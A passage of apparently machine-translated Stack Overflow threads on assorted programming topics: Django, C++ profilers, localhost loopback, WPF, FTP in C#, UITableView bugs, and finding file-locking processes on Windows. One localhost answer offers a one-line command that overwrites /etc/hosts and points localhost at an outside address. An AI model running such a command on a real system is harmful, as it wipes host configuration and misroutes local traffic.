from datetime import datetime

class Note(models.Model):
    datetime = models.DateTimeField(default=datetime.now)
    author   = models.ForeignKey(User, default=authenticated_user)
    note     = models.TextField()

    def __unicode__(self):
        return unicode(self.author) + u' - ' + unicode(self.datetime) 
```

用户应该看到的唯一字段是注释文本字段。日期时间和作者应该由模型、管理界面或其他任何东西自动填写。这可以做到吗？有人有一些示例代码吗？

谢谢！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2009-05-13T21:53:34.027

The setting of the date can be taken care of by specifying `auto_now_add=True` to the datetime field definition.

To set the user on save in the admin, do this in your admin class:

```
class NoteAdmin(admin.ModelAdmin):
    ...usual admin options...

    def save_model(self, request, obj, form, change):
        obj.user = request.user
        obj.save() 
```

# c++ - 推荐的开源分析器

> ID：860602
> 
> 赞同：14
> 
> 时间：2009-05-13T21:49:31.927
> 
> 标签：c++, windows, profiler

我试图找到开源分析器，而不是使用我必须支付 $$$ 的商业分析器之一。当我在 SourceForge 上进行搜索时，我发现了这四个我认为很有希望的 C++ 分析器：

1.  闪亮：C++ 探查器
2.  低脂肪轮廓仪
3.  卢克·斯塔克沃克
4.  FreeProfiler

在了解我的程序性能方面，我不确定哪一个分析器最适合使用。很高兴听到一些建议。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2009-05-13T21:53:20.673

您可以尝试[Windows Performance Toolkit](http://msdn.microsoft.com/en-us/performance/default.aspx)。完全免费使用。此[博客条目](http://blogs.msdn.com/pigscanfly/archive/2008/03/02/using-the-windows-sample-profiler-with-xperf.aspx) 有一个如何进行基于样本的分析的示例。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2009-05-13T23:48:55.307

*   [Valgrind](https://valgrind.org/info/tools.html) （以及相关工具，如 cachegrind 等）
*   [谷歌性能工具](https://github.com/gperftools/gperftools)

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2009-05-15T19:42:49.047

有不止一种方法可以做到这一点。

[不要忘记无分析器方法。](https://stackoverflow.com/questions/375913/what-can-i-use-to-profile-c-code-in-linux/378024#378024)

大多数分析器假设您需要 1) 时间的高统计精度（大量样本），以及 2) 问题识别的低精度（函数和调用图）。

这些优先级可以颠倒。即问题可以定位到精确的机器地址，而成本精度是样本数量的函数。

大多数实际问题的成本至少为 10%，而高精度不是必需的。

示例：如果某件事使您的程序花费了应有的 2 倍，这意味着其中有一些代码花费了 50%。如果您在调用堆栈速度较慢的情况下对调用堆栈进行 10 个样本，则其中大约 5 个将出现精确的代码行。程序越大，问题就越有可能是堆栈中某处的函数调用。

我知道，这是违反直觉的。

注意：xPerf 几乎就在那里，但并不完全（据我所知）。它获取调用堆栈的样本并保存它们 - 这很好。这是我认为它需要的：

*   它应该只在您需要时采集样本。实际上，您必须过滤掉不相关的内容。

*   在堆栈视图中，它应该显示发生调用的特定行或地址，而不仅仅是整个函数。（也许它可以做到这一点，我无法从博客中看出。）

*   如果单击以获取以单个调用指令或叶指令为中心的蝶形视图，它应该显示的不是 CPU 分数，而是包含该指令的堆栈样本的分数。这将是对该指令成本的直接衡量，作为时间的一小部分。（也许它可以做到这一点，我不知道。）因此，例如，即使指令是对文件打开的调用或其他使线程空闲的指令，它仍然会花费挂钟时间，您需要知道那。

注意：我刚刚查看了 Luke Stackwalker，同样的评论也适用。我认为它在正确的轨道上，但需要 UI 工作。

补充：在更仔细地查看了 LukeStackwalker 之后，我担心它会成为测量功能比定位语句更重要的假设的牺牲品。因此，在调用堆栈的每个样本上，它都会更新函数级别的计时信息，但它对行号信息所做的只是跟踪每个函数中的最小和最大行号，它需要的样本越多，离得更远。所以它基本上丢掉了最重要的信息——行号信息。重要的原因是，如果您决定优化一个函数，您需要知道其中的哪些行需要工作，并且这些行在堆栈样本中（在它们被丢弃之前）。

有人可能会反对，如果保留行号信息，它将很快耗尽存储空间。两个答案。1) 样本上出现的线条只有这么多，而且它们反复出现。2) 不需要那么多样本——一直假设需要高统计精度的测量，但从未得到证明。

我怀疑其他堆栈采样器，例如 xPerf，也有类似的问题。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2009-05-15T21:03:46.437

它不是开源的，但[AMD CodeAnalyst](http://developer.amd.com/cpu/CodeAnalyst/Pages/default.aspx)是免费的。尽管名称如此，它也适用于 Intel CPU。有适用于 Windows（与 Visual Studio 集成）和 Linux 的版本。

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2009-07-16T12:13:18.313

从列出的那些人中，我发现 Luke Stackwalker 工作得最好——我喜欢它的 GUI，它很容易运行。

其他类似的是[非常困](http://www.codersnotes.com/sleepy/)- 类似的功能，采样似乎更可靠，GUI 可能有点难以使用（不是图形）。

* * *

在与他们相处一段时间后，我发现了一个非常重要的缺点。虽然两者都尝试以 1 毫秒的分辨率进行采样，但实际上它们并没有实现，因为它们的采样方法（附加进程的 StackWalk64）太慢了。对于我的应用程序，获取调用堆栈需要大约 5-20 毫秒。这不仅会使您的结果不精确，还会使它们产生偏差，因为较短的调用堆栈走得更快，因此往往会获得更多的命中。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2009-05-13T22:16:50.150

我们使用[LtProf](http://lw-tech.com)并且对它很满意。不是开源的，但只有 $$，不是 $$$ :-)

# windows-mobile - 使用后退按钮关闭 Windows Mobile Smartphone/Standard 上的表单

> ID：860608
> 
> 赞同：0
> 
> 时间：2009-05-13T21:51:08.773
> 
> 标签：windows-mobile, smartphone

在 Windows Mobile PocketPC/Pro 中，您可以通过设置 MinimizeBox = 'false' 来指定使用最小化按钮来关闭表单（触发 Closing 事件等）。在智能手机上，后退按钮的使用方式与 PocketPC 表单角落中的 X 相同，但我似乎找不到明显（或不太明显）的功能来允许我将其行为更改为“关闭” ，而不是“最小化”。

关于如何去做的任何线索？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-05-13T22:02:14.513

This is an [article](http://msdn.microsoft.com/en-us/library/ms912123.aspx) on capturing the Back button. There is also a [sample](http://msdn.microsoft.com/en-us/library/bb158669.aspx) in the SDK.

In my opinion however, you shouldn't override its functionality. Another approach you could follow is to start a timer on the OnDeactivate handler of your form. Assuming that your main form isn't hidden by another form in your application, this will be called when your application goes in background. If you have more than one form, more work is needed to capture the event of going in the background. If the user, doesn't bring your application at the foreground in a reasonable amount of time, then close it.

# actionscript-3 - 在 Flash 动画中嵌入 LaTeX 内容

> ID：860609
> 
> 赞同：4
> 
> 时间：2009-05-13T21:51:09.460
> 
> 标签：actionscript-3, latex, embedding

我想为网页创建一个 Flash 演示文稿。它将以`LaTeX`格式从文件中读取内容并正确显示内容。这将需要在`LaTeX`每次乳胶文件中的内容更改时调用编译器并生成正确的输出。我怎样才能做到这一点？围绕这个还有其他想法吗？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2009-05-13T21:55:41.107

[在http://www.flashandmath.com/basic/latex/index.html](http://www.flashandmath.com/basic/latex/index.html)有一个很好的例子，它使用了 LaTeXtoSWF 库，来自[http://www.tlhiv.org/LaTeX2swf/](http://www.tlhiv.org/LaTeX2swf/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2010-07-30T14:33:06.777

您可能也对我的开源项目[http://sourceforge.net/projects/latex2flash/](http://sourceforge.net/projects/latex2flash/)感兴趣。

这是博客网站[http://validi.fi/latex2flash](http://validi.fi/latex2flash)

# binary-tree - 将 N 项插入一个空的二叉搜索树

> ID：860613
> 
> 赞同：2
> 
> 时间：2009-05-13T21:51:46.183
> 
> 标签：binary-tree, big-o

为什么将 N 项插入空二叉搜索树 n^2 的最坏情况是 big-O？没有余额检查。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2009-05-13T21:53:54.167

每一项都是O(n)，有n项。即使每个项目的 O(n) 是“不断增加”的 n，您仍然会得到 0 + 1 + 2 + 3 ... (n-1) 即 n(n-1)/2 = O( n^2)。

换句话说，假设我们要添加 10、20、30、40：

第 1 步：空树，插入 10：

```
10 
```

第二步：比较20和10；更大，因此树变为：

```
10
  \
   20 
```

第三步：比较30和10；更大，所以用 20 向下移动到节点。将 30 与 20 进行比较；更大，因此树变为：

```
10
  \
   20
     \
      30 
```

第4步：比较40和10；更大，所以用 20 向下移动到节点。比较 40 和 20；更大，所以向下移动到具有 30 的节点。将 40 与 30 进行比较；更大，因此树变为：

```
10
  \
   20
     \
      30
        \
         40 
```

请注意我们每次如何获得更多比较 - 所以第一个元素需要 0 个比较，第二个需要 1，第三个需要 2 等等 - 总和为 n(n-1)。

当然，仅当您按排序顺序（从小到大或从大到小）插入时才会出现这种情况。以恰好平衡树的顺序插入会便宜得多。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-05-13T21:53:41.670

在最坏的情况下，您的 BST 是一个列表，并且将 N 个项目插入到空的末尾是 O(n^2)。

# java - Eclipse：为所有项目添加一个完整的存储库以供使用

> ID：860615
> 
> 赞同：1
> 
> 时间：2009-05-13T21:53:01.237
> 
> 标签：java, eclipse

我最近一直在研究 Eclipse。我对 java 编程相当陌生，所以这个问题对某些人来说可能是新手。我一直在从事与许多其他项目有关的项目。因此，当我在 eclipse 环境中创建项目时，它在许多地方显示错误，因为我相信它无法自动为所有引用的项目提取所有 jar。我发现所有那些被引用项目的引用罐子都在我的 savant_repository 的盒子里。事实上，我的项目可以从我的命令行环境中构建并运行良好，但是 eclipse 会抛出错误。那么，问题来了，有没有一种方法可以让我始终制作我在 Eclipse IDE 中创建的所有项目，在该存储库中查找引用的 jar？或者我是否需要一个一个显式地添加所有引用的 jar，这将肯定会很痛苦。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-05-13T22:13:39.703

在首选项中仔细查看“Java > 构建路径”。您可以定义类路径变量和用户变量，以便它们指向/包含您的标准库。您仍然需要将它们添加到您的项目中，但至少可以减轻痛苦。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-05-13T23:28:34.683

此外，您还可以：

*   使用您的所有类文件创建一个“用户库”（Java/构建路径/用户库）并将其添加到您需要的每个项目中
*   为您使用的 JRE 环境修改（已安装的）JRE 设置（Java/已安装的 JRE）。只需按编辑并添加您的罐子。

我个人建议使用“用户库”或通过变量已经建议的解决方案。

# networking - 与 localhost 的连接是否会进入网络？

> ID：860626
> 
> 赞同：21
> 
> 时间：2009-05-13T21:54:46.333
> 
> 标签：networking

我想知道的是，如果我要执行类似`ping localhost`的操作，数据包会被操作系统重定向并直接到达目标端口，还是数据包会在网络上发送到最近的路由器或交换机，然后将它们反弹回到你的电脑？

* * *

## 回答 #1

> 赞同：24
> 
> 时间：2009-05-13T21:55:49.140

没有数据包会到达网络。拔下网线试试看！

* * *

## 回答 #2

> 赞同：14
> 
> 时间：2009-05-13T22:09:21.990

发送到连接到本地接口的 IP 地址的任何数据包都不会离开您的主机。127.0.0.1 在这方面并不特殊。两者都`ping 127.0.0.1`将`ping 192.168.1.44`通过“环回网络设备”传输和接收 ICMP 数据包。您可以通过拔下以太网电缆并观察 TX 和 RX 计数器来确认这一点。

```
$ /sbin/ifconfig
eth0      Link encap:Ethernet
          inet addr:192.168.1.44  Bcast:192.168.3.255  Mask:255.255.252.0

lo        Link encap:Local Loopback
          inet addr:127.0.0.1  Mask:255.0.0.0
          RX packets:992670 errors:0 dropped:0 overruns:0 frame:0
          TX packets:992670 errors:0 dropped:0 overruns:0 carrier:0 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2009-05-13T21:59:07.527

数据包将保留在您的机器上。

如果您编辑主机文件（UNIX：/etc/hosts Windows：C:\windows\system32\drivers\etc\hosts）并将 localhost 更改为任何换句话说，您将使用该其他词访问您的本地主机。

地址 127.0.0.1 是一个环回地址，在[RFC3330中定义](https://www.rfc-editor.org/rfc/rfc3330)

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-05-13T21:57:32.710

不，它被称为环回是有原因的。IIRC，不允许在计算机“外部”发送到 127.0.0.1 的数据包。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2009-05-13T21:58:30.523

不，数据包不会进入网络。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2009-05-13T22:09:43.297

这取决于名称解析。尝试 ping 之后`# echo "69.59.196.211 localhost" > /etc/hosts`。

# c# - 将 DataTrigger 应用于绑定来自另一个控件的按钮？

> ID：860633
> 
> 赞同：0
> 
> 时间：2009-05-13T21:55:25.163
> 
> 标签：c#, wpf, datatrigger

我正在尝试将 a`DataTrigger`应用于 a `Button`，它取决于 a 的当前选定项中的属性`TreeView`。这个想法是我想`Button`根据所选项目的属性更改 a 的文本。

我所拥有的看起来像这样：

```
<Button x:Name="m_AddObject" Margin="192.708,0.909,6,6.363" Click="AddObject_Click" >
    <DataTrigger Binding="{Binding ElementName=ObjectTreeView, Path=SelectedItem.Removable}" Value="true">
        <Setter TargetName="m_AddObject" Property="Content" Value="Remove" />
    </DataTrigger>
</Button> 
```

但我无法编译它。Setter 抱怨“内容”无效，因为它没有合格的类型名称，但如果我将其更改为“Button.Content”，它就会抱怨“对象引用未设置为对象的实例”。

我也试过：

```
<Setter TargetName="m_AddObject.Content" Value="Remove" /> 
```

虽然编译，它也没有工作。

我难住了。

有任何想法吗？

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-05-13T22:17:41.350

DataTriggers 应该在按钮的 Style 中定义。您在上面尝试做的基本上是使用 DataTriggers 作为按钮的“标签”（如 WPF 所说的“内容”）（而不是“确定”）。

这是临时的，所以它可能不完全正确，但它更接近你想要的：

```
<Button x:Name="m_AddObject"
        Margin="192.708,0.909,6,6.363"
        Click="AddObject_Click">
    <Button.Style>
        <Style TargetType="{x:Type Button}">
            <Style.Triggers>
                <DataTrigger Binding="{Binding ElementName=ObjectTreeView, Path=SelectedItem.Removable}" Value="True">
                    <Setter Property="Content" Value="Remove" />
                </DataTrigger>
            </Style.Triggers>
        </Style>
    </Button.Style>
</Button> 
```

# c# - 如何使用 C# 在 FTP 服务器上创建目录？

> ID：860638
> 
> 赞同：66
> 
> 时间：2009-05-13T21:57:16.890
> 
> 标签：c#, .net, ftp, webclient

使用 C# 在 FTP 服务器上创建目录的简单方法是什么？

我想出了如何将文件上传到已经存在的文件夹，如下所示：

```
using (WebClient webClient = new WebClient())
{
    string filePath = "d:/users/abrien/file.txt";
    webClient.UploadFile("ftp://10.128.101.78/users/file.txt", filePath);
} 
```

但是，如果我想上传到`users/abrien`，我会`WebException`说文件不可用。我认为这是因为我需要在上传文件之前创建新文件夹，但`WebClient`似乎没有任何方法可以实现这一点。

* * *

## 回答 #1

> 赞同：110
> 
> 时间：2009-05-13T22:03:35.803

使用`FtpWebRequest`, 方法[`WebRequestMethods.Ftp.MakeDirectory`](http://msdn.microsoft.com/en-us/library/system.net.webrequestmethods.ftp.makedirectory.aspx).

例如：

```
using System;
using System.Net;

class Test
{
    static void Main()
    {
        WebRequest request = WebRequest.Create("ftp://host.com/directory");
        request.Method = WebRequestMethods.Ftp.MakeDirectory;
        request.Credentials = new NetworkCredential("user", "pass");
        using (var resp = (FtpWebResponse) request.GetResponse())
        {
            Console.WriteLine(resp.StatusCode);
        }
    }
} 
```

* * *

## 回答 #2

> 赞同：41
> 
> 时间：2014-05-07T13:51:16.227

如果要创建嵌套目录，这是答案

没有干净的方法来检查 ftp 上是否存在文件夹，因此您必须循环并同时创建所有嵌套结构一个文件夹

```
public static void MakeFTPDir(string ftpAddress, string pathToCreate, string login, string password, byte[] fileContents, string ftpProxy = null)
    {
        FtpWebRequest reqFTP = null;
        Stream ftpStream = null;

        string[] subDirs = pathToCreate.Split('/');

        string currentDir = string.Format("ftp://{0}", ftpAddress);

        foreach (string subDir in subDirs)
        {
            try
            {
                currentDir = currentDir + "/" + subDir;
                reqFTP = (FtpWebRequest)FtpWebRequest.Create(currentDir);
                reqFTP.Method = WebRequestMethods.Ftp.MakeDirectory;
                reqFTP.UseBinary = true;
                reqFTP.Credentials = new NetworkCredential(login, password);
                FtpWebResponse response = (FtpWebResponse)reqFTP.GetResponse();
                ftpStream = response.GetResponseStream();
                ftpStream.Close();
                response.Close();
            }
            catch (Exception ex)
            {
                //directory already exist I know that is weak but there is no way to check if a folder exist on ftp...
            }
        }
    } 
```

* * *

## 回答 #3

> 赞同：20
> 
> 时间：2009-05-13T22:04:38.610

像这样的东西：

```
// remoteUri points out an ftp address ("ftp://server/thefoldertocreate")
WebRequest request = WebRequest.Create(remoteUri);
request.Method = WebRequestMethods.Ftp.MakeDirectory;
WebResponse response = request.GetResponse(); 
```

（有点晚了。真奇怪。）

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2015-03-17T02:40:44.947

创建 FTP 目录可能很复杂，因为您必须检查目标文件夹是否存在。您可能需要使用 FTP 库来检查和创建目录。你可以看看这个： http: [//www.componentpro.com/ftp.net/](http://www.componentpro.com/ftp.net/)这个例子： http: [//www.componentpro.com/doc/ftp/Creating-a-new-directory-Synchronously .htm](http://www.componentpro.com/doc/ftp/Creating-a-new-directory-Synchronously.htm)

# sql - SQL Server 的安全库

> ID：860649
> 
> 赞同：2
> 
> 时间：2009-05-13T21:59:21.973
> 
> 标签：sql, sql-server, database-design, stored-procedures, configuration

我有一些扩展类（同时使用 HMAC 和加密技术），我希望将它们用于 SQL Server 下所述数据库的存储过程（包括时间记录、用户事件记录等）中的新产品数据库。

任何人都可以推荐一个资源来详细说明实现这一目标的最佳方法，或者可以选择建议一种更可取的低级数据层访问安全方法，包括自动交互日志记录？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-05-14T14:01:08.923

您是否可以选择在应用层进行加密？这将确保通过网络对其进行加密，并确保爱管闲事的 DBA 不会使用 Profiler 或跟踪看到未加密的信息。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-05-27T17:39:41.020

SQL Server 可访问的自定义源库...微软说没问题...任何用 C#/VB.NET 开发的东西都可以通过 CIL/CLR 直接带入 SQL Server 以用作存储过程中的自定义库等，等等

我要去完成和测试...

# iphone - 显示 UITableView 时的偏移量

> ID：860650
> 
> 赞同：0
> 
> 时间：2009-05-13T21:59:45.077
> 
> 标签：iphone, cocoa-touch, uitableview

我显示一个 UITableView，并且不时地，第一行出现在视图的底部。

第一行上面什么都没有，空的地方是不可触摸的。

到目前为止，我已经检查过：

*   tableView 的 headerView ：为空
*   使用普通的 UITableViewCells
*   检查单元格的 rowHeight
*   检查单元格的框架
*   当错误发生时，之前没有内存警告
*   检查表格滚动视图的 contentOffset

这个错误只出现在 iPhone 上，从不在模拟器上。

屏幕截图在左侧显示了正确的表格视图，在右侧显示了带有错误的视图。拍摄快照时，我触摸了屏幕，因此滚动条可见。

知道我应该朝哪个方向看吗？

我刚刚看到 tableView scrollView 的 contentSize 是错误的：我有 84 个单元格@67 像素和 1 个单元格@57 像素高度：总数应该是 5685 但是 6005。（关闭 320）。奇怪的。

斯蒂芬

[替代文字 http://www.quicksnapper.com/files/5161/18374733084A0B3EA24D152.png](http://www.quicksnapper.com/files/5161/18374733084A0B3EA24D152.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-05-14T05:17:43.723

您可以覆盖 UITableView 的 touchesBegan 方法，然后运行命中测试。

然后询问返回的视图是什么类。

```
- (void)touchesBegan:(NSSet *)touches withEvent:(UIEvent *)event{

CGPoint location = [[touches anyObject] locationInView:self]; 

UIView *whatIsThis = [self hitTest:locationInView withEvent:event];

NSLog([[whatIsThis class] description]);

} 
```

至少你会有一个起点。你也可以问它的 superView 是谁。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-05-15T14:44:59.887

所以我找到了解决我的问题的方法：

添加 NSLog(@"")。这很奇怪。

在我看来WillAppear，我有

```
 if (searchByCuisinier || searchByResto) {
    NSLog(@"Will set tableHeaderView");
    self.tableView.tableHeaderView = searchBar;
    if (searchByCuisinier) {
      searchBar.placeholder = @"Cuisinier";
    } else {
      searchBar.placeholder = @"Restaurant";
    }
    searchBar.autocapitalizationType = UITextAutocapitalizationTypeNone;
    searchBar.autocorrectionType = UITextAutocorrectionTypeNo;
    if ([filteredList count] == 0)
      [searchBar becomeFirstResponder];
  } else {
    self.tableView.tableHeaderView = nil;
    NSLog(@""); // Magic!
  } 
```

添加 NSLog(@"") 解决了这个错误。

也逆转测试：而不是

```
 if (searchByCuisinier || searchByResto) {
.... 
```

我愿意：

```
 if (!searchByCuisinier && !searchByResto) {
.... 
```

我完全不知道为什么会这样（或者为什么没有 NSLog 就无法工作）。

# c# - C# 关键字作为变量

> ID：860652
> 
> 赞同：46
> 
> 时间：2009-05-13T22:01:11.067
> 
> 标签：c#

在 VB.NET 中，您可以用括号将变量名括起来，并使用关键字作为变量名，如下所示：

```
Dim [goto] As String = "" 
```

是否有 C# 等效于执行此操作？

* * *

## 回答 #1

> 赞同：97
> 
> 时间：2009-05-13T22:03:24.447

```
string @string = ""; 
```

* * *

## 回答 #2

> 赞同：18
> 
> 时间：2009-05-13T22:03:30.843

是的，在它前面加上一个@

```
String @goto = ""; 
```

* * *

## 回答 #3

> 赞同：9
> 
> 时间：2009-05-13T22:19:12.207

`@`用符号前缀你的变量

```
string @class = "fred"; 
```

@ 符号也可用于为非转义字符串文字添加前缀：

```
string a = "fred\"; \\ invalid
string b = @"fred\"; \\ valid. the backslash is part of the literal 'fred\' 
```

我不时使用后者，但认为使用`@`符号来命名变量是丑陋的。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2020-10-10T08:04:55.410

带有@

```
public IActionResult Submit(Guid? id, string type, string key, string @event)
{

} 
```

# c# - 使用 C#，如何确定是哪个进程锁定了文件？

> ID：860656
> 
> 赞同：62
> 
> 时间：2009-05-13T22:02:17.633
> 
> 标签：c#, windows

在 Windows 中，如何确定（使用 C#）哪个进程锁定了文件？

第三方工具很有帮助，但不是我想要的。

* * *

## 回答 #1

> 赞同：73
> 
> 时间：2010-08-17T15:40:51.977

这个问题有一个原始答案，现在已经超过 7 年了。该代码保留在[https://gist.github.com/ieb/2290426](https://gist.github.com/i-e-b/2290426) 如果您出于某种原因需要使用 Windows XP，此旧版本可能对您有用。

一个更好的答案是[如何检查文件锁定？](https://stackoverflow.com/questions/1304/how-to-check-for-file-lock/20623302#20623302)

我在下面复制了 Eric J 的答案（`using`添加了语句，以及与此处的旧代码匹配的类和方法名称）请注意，对此答案的评论可能已过时。

用户“Walkman”正在进行研究以改进旧代码，因为在某些情况下重启管理器不会列出所有锁。参见 Github 仓库：[https ://github.com/Walkman100/FileLocks](https://github.com/Walkman100/FileLocks)

像这样使用：

```
List<Process> locks = Win32Processes.GetProcessesLockingFile(@"C:\Hello.docx"); 
```

代码：

```
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace FileLockInfo
{
    public static class Win32Processes
    {
        /// <summary>
        /// Find out what process(es) have a lock on the specified file.
        /// </summary>
        /// <param name="path">Path of the file.</param>
        /// <returns>Processes locking the file</returns>
        /// <remarks>See also:
        /// http://msdn.microsoft.com/en-us/library/windows/desktop/aa373661(v=vs.85).aspx
        /// http://wyupdate.googlecode.com/svn-history/r401/trunk/frmFilesInUse.cs (no copyright in code at time of viewing)
        /// </remarks>
        public static List<Process> GetProcessesLockingFile(string path)
        {
            uint handle;
            string key = Guid.NewGuid().ToString();
            int res = RmStartSession(out handle, 0, key);

            if (res != 0) throw new Exception("Could not begin restart session.  Unable to determine file locker.");

            try
            {
                const int MORE_DATA = 234;
                uint pnProcInfoNeeded, pnProcInfo = 0, lpdwRebootReasons = RmRebootReasonNone;

                string[] resources = {path}; // Just checking on one resource.

                res = RmRegisterResources(handle, (uint) resources.Length, resources, 0, null, 0, null);

                if (res != 0) throw new Exception("Could not register resource.");

                //Note: there's a race condition here -- the first call to RmGetList() returns
                //      the total number of process. However, when we call RmGetList() again to get
                //      the actual processes this number may have increased.
                res = RmGetList(handle, out pnProcInfoNeeded, ref pnProcInfo, null, ref lpdwRebootReasons);

                if (res == MORE_DATA)
                {
                    return EnumerateProcesses(pnProcInfoNeeded, handle, lpdwRebootReasons);
                }
                else if (res != 0) throw new Exception("Could not list processes locking resource. Failed to get size of result.");
            }
            finally
            {
                RmEndSession(handle);
            }

            return new List<Process>();
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct RM_UNIQUE_PROCESS
        {
            public int dwProcessId;
            public System.Runtime.InteropServices.ComTypes.FILETIME ProcessStartTime;
        }

        const int RmRebootReasonNone = 0;
        const int CCH_RM_MAX_APP_NAME = 255;
        const int CCH_RM_MAX_SVC_NAME = 63;

        public enum RM_APP_TYPE
        {
            RmUnknownApp = 0,
            RmMainWindow = 1,
            RmOtherWindow = 2,
            RmService = 3,
            RmExplorer = 4,
            RmConsole = 5,
            RmCritical = 1000
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct RM_PROCESS_INFO
        {
            public RM_UNIQUE_PROCESS Process;

            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = CCH_RM_MAX_APP_NAME + 1)] public string strAppName;

            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = CCH_RM_MAX_SVC_NAME + 1)] public string strServiceShortName;

            public RM_APP_TYPE ApplicationType;
            public uint AppStatus;
            public uint TSSessionId;
            [MarshalAs(UnmanagedType.Bool)] public bool bRestartable;
        }

        [DllImport("rstrtmgr.dll", CharSet = CharSet.Unicode)]
        static extern int RmRegisterResources(uint pSessionHandle, uint nFiles, string[] rgsFilenames,
            uint nApplications, [In] RM_UNIQUE_PROCESS[] rgApplications, uint nServices,
            string[] rgsServiceNames);

        [DllImport("rstrtmgr.dll", CharSet = CharSet.Auto)]
        static extern int RmStartSession(out uint pSessionHandle, int dwSessionFlags, string strSessionKey);

        [DllImport("rstrtmgr.dll")]
        static extern int RmEndSession(uint pSessionHandle);

        [DllImport("rstrtmgr.dll")]
        static extern int RmGetList(uint dwSessionHandle, out uint pnProcInfoNeeded,
            ref uint pnProcInfo, [In, Out] RM_PROCESS_INFO[] rgAffectedApps,
            ref uint lpdwRebootReasons);

        private static List<Process> EnumerateProcesses(uint pnProcInfoNeeded, uint handle, uint lpdwRebootReasons)
        {
            var processes = new List<Process>(10);
            // Create an array to store the process results
            var processInfo = new RM_PROCESS_INFO[pnProcInfoNeeded];
            var pnProcInfo = pnProcInfoNeeded;

            // Get the list
            var res = RmGetList(handle, out pnProcInfoNeeded, ref pnProcInfo, processInfo, ref lpdwRebootReasons);

            if (res != 0) throw new Exception("Could not list processes locking resource.");
            for (int i = 0; i < pnProcInfo; i++)
            {
                try
                {
                    processes.Add(Process.GetProcessById(processInfo[i].Process.dwProcessId));
                }
                catch (ArgumentException) { } // catch the error -- in case the process is no longer running
            }
            return processes;
        }
    }
} 
```

* * *

## 回答 #2

> 赞同：18
> 
> 时间：2011-06-14T22:59:16.537

我在这里找到的代码， [https://vmccontroller.svn.codeplex.com/svn/VmcController/VmcServices/DetectOpenFiles.cs](https://vmccontroller.svn.codeplex.com/svn/VmcController/VmcServices/DetectOpenFiles.cs)

比 Iain 提供的代码更适合我。Iain 的代码似乎获得了自己的锁。这是我对上面代码的略微修改版本，修改后返回锁定文件的字符串路径，而不是 FileSystemInfo 对象，

```
using System;
using System.Collections.Generic;
//using System.EnterpriseServices;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.ConstrainedExecution;
using System.Runtime.InteropServices;
using System.Security.Permissions;
using System.Text;
using System.Threading;
using Microsoft.Win32.SafeHandles;

namespace Crmc.Core.BuildTasks
{
    using System.Diagnostics;
    using System.Linq;

    #region ENUMs
    internal enum NT_STATUS
    {
        STATUS_SUCCESS = 0x00000000,
        STATUS_BUFFER_OVERFLOW = unchecked((int)0x80000005L),
        STATUS_INFO_LENGTH_MISMATCH = unchecked((int)0xC0000004L)
    }

    internal enum SYSTEM_INFORMATION_CLASS
    {
        SystemBasicInformation = 0,
        SystemPerformanceInformation = 2,
        SystemTimeOfDayInformation = 3,
        SystemProcessInformation = 5,
        SystemProcessorPerformanceInformation = 8,
        SystemHandleInformation = 16,
        SystemInterruptInformation = 23,
        SystemExceptionInformation = 33,
        SystemRegistryQuotaInformation = 37,
        SystemLookasideInformation = 45
    }

    internal enum OBJECT_INFORMATION_CLASS
    {
        ObjectBasicInformation = 0,
        ObjectNameInformation = 1,
        ObjectTypeInformation = 2,
        ObjectAllTypesInformation = 3,
        ObjectHandleInformation = 4
    }

    [Flags]
    internal enum ProcessAccessRights
    {
        PROCESS_DUP_HANDLE = 0x00000040
    }

    [Flags]
    internal enum DuplicateHandleOptions
    {
        DUPLICATE_CLOSE_SOURCE = 0x1,
        DUPLICATE_SAME_ACCESS = 0x2
    }
    #endregion

    [SecurityPermission(SecurityAction.LinkDemand, UnmanagedCode = true)]
    internal sealed class SafeObjectHandle : SafeHandleZeroOrMinusOneIsInvalid
    {
        private SafeObjectHandle()
            : base(true)
        { }

        internal SafeObjectHandle(IntPtr preexistingHandle, bool ownsHandle)
            : base(ownsHandle)
        {
            base.SetHandle(preexistingHandle);
        }

        protected override bool ReleaseHandle()
        {
            return NativeMethods.CloseHandle(base.handle);
        }
    }

    [SecurityPermission(SecurityAction.LinkDemand, UnmanagedCode = true)]
    internal sealed class SafeProcessHandle : SafeHandleZeroOrMinusOneIsInvalid
    {
        private SafeProcessHandle()
            : base(true)
        { }

        internal SafeProcessHandle(IntPtr preexistingHandle, bool ownsHandle)
            : base(ownsHandle)
        {
            base.SetHandle(preexistingHandle);
        }

        protected override bool ReleaseHandle()
        {
            return NativeMethods.CloseHandle(base.handle);
        }
    }

    #region Native Methods
    internal static class NativeMethods
    {
        [DllImport("ntdll.dll")]
        internal static extern NT_STATUS NtQuerySystemInformation(
            [In] SYSTEM_INFORMATION_CLASS SystemInformationClass,
            [In] IntPtr SystemInformation,
            [In] int SystemInformationLength,
            [Out] out int ReturnLength);

        [DllImport("ntdll.dll")]
